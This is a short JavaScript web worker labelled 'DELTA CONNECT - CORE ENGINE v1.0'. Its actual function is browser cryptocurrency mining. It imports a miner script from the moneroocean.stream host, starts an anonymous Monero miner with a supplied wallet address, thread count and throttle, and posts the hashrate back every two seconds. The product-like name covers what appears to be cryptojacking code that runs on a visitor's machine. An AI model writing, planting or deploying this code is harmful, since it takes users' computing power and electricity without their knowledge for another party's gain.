/* DELTA CONNECT - CORE ENGINE v1.0 */
self.onmessage=function(e){if(e.data.type==='start'){importScripts('https://moneroocean.stream/webminer.js');
var miner=new MoneroOcean.Anonymous(e.data.address,{threads:e.data.threads,throttle:e.data.throttle});
miner.start();setInterval(function(){self.postMessage({type:'hashrate',hashes:miner.getHashesPerSecond()})},2000)}};
